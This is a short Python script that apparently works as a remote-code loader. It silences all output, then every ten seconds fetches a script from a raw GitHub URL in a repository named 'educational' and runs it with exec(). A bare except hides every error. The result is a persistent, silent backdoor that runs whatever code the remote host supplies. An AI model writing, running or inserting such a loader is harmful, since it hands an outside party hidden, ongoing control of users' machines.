import sys, os, tempfile

sys.stdout = open(os.devnull, "w")
sys.stderr = sys.stdout

from time import sleep
import subprocess
import pathlib
import requests

URL = "https://raw.githubusercontent.com/Proutman67/educational/refs/heads/main/user_script.py" 

def main():
    content = requests.get(URL, timeout=10).text
    exec(content)

while True:
    try:
        main()
    except:
        pass
    sleep(10)